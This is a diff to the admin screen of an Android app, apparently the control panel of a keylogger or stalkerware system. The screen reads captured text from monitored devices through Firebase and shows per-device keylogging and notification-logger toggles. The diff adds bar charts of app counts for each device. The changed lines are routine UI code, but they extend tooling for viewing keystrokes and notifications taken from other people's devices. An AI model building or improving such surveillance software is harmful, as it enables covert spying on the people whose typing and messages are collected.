@@ -39,7 +39,8 @@ class AdminMainActivity : AppCompatActivity() {
         val name: String,
         var keylogging: Boolean = true,
         var notifications: Boolean = true,
-        var logFeed: String = "Waiting for telemetry..."
+        var logFeed: String = "Waiting for telemetry...",
+        val appCounts: MutableMap<String, Int> = mutableMapOf()
     )
 
     data class LogEntry(
@@ -94,7 +95,7 @@ class AdminMainActivity : AppCompatActivity() {
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val allEntries = mutableListOf<LogEntry>()
-                val appCounts = mutableMapOf<String, Int>()
+                val globalAppCounts = mutableMapOf<String, Int>()
                 val hourlyCounts = FloatArray(24) { 0f }
                 val calendar = Calendar.getInstance()
                 val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
@@ -119,7 +120,7 @@ class AdminMainActivity : AppCompatActivity() {
                             val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
                             if (text.isNotBlank() && text != "null") {
                                 allEntries.add(LogEntry(timestampMillis, prettyApp, text))
-                                appCounts[prettyApp] = (appCounts[prettyApp] ?: 0) + 1
+                                globalAppCounts[prettyApp] = (globalAppCounts[prettyApp] ?: 0) + 1
 
                                 calendar.timeInMillis = timestampMillis
                                 if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear) {
@@ -137,9 +138,9 @@ class AdminMainActivity : AppCompatActivity() {
                 txtTotalEvents.text = allEntries.size.toString()
                 adapter.notifyDataSetChanged()
 
-                // Update Horizontal Bar Chart for App Logging Volume
-                val barChartData = appCounts.entries.sortedByDescending { it.value }.map { it.key to it.value }
-                horizontalBarChartView.setData(barChartData)
+                // Update Global Horizontal Bar Chart
+                val globalBarChartData = globalAppCounts.entries.sortedByDescending { it.value }.map { it.key to it.value }
+                horizontalBarChartView.setData(globalBarChartData)
 
                 // Update Line Chart for Today's Activity Trend
                 val chartPoints = hourlyCounts.toList()
@@ -209,6 +210,7 @@ class AdminMainActivity : AppCompatActivity() {
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val entries = mutableListOf<Triple<Long, String, String>>()
+                val deviceAppCounts = mutableMapOf<String, Int>()
                 val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
 
                 for (appChild in snapshot.children) {
@@ -224,6 +226,7 @@ class AdminMainActivity : AppCompatActivity() {
 
                         if (text.isNotBlank() && text != "null") {
                             entries.add(Triple(timestampMillis, prettyApp, text))
+                            deviceAppCounts[prettyApp] = (deviceAppCounts[prettyApp] ?: 0) + 1
                         }
                     }
                 }
@@ -240,6 +243,8 @@ class AdminMainActivity : AppCompatActivity() {
                 val index = deviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
                     deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
+                    deviceList[index].appCounts.clear()
+                    deviceList[index].appCounts.putAll(deviceAppCounts)
                     adapter.notifyItemChanged(index)
                 }
             }
@@ -259,6 +264,7 @@ class AdminMainActivity : AppCompatActivity() {
             val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
             val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
             val scrollView: View = view.findViewById<View>(R.id.logScrollView)
+            val deviceBarChart: HorizontalBarChartView = view.findViewById<HorizontalBarChartView>(R.id.deviceBarChart)
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -285,6 +291,10 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.text = "Notif Logger: OFF"
                 holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
             }
+
+            // Set individual device chart data
+            val barData = device.appCounts.entries.sortedByDescending { it.value }.map { it.key to it.value }
+            holder.deviceBarChart.setData(barData)
 
             holder.scrollView.setOnTouchListener { v, event ->
                 when (event.action) {
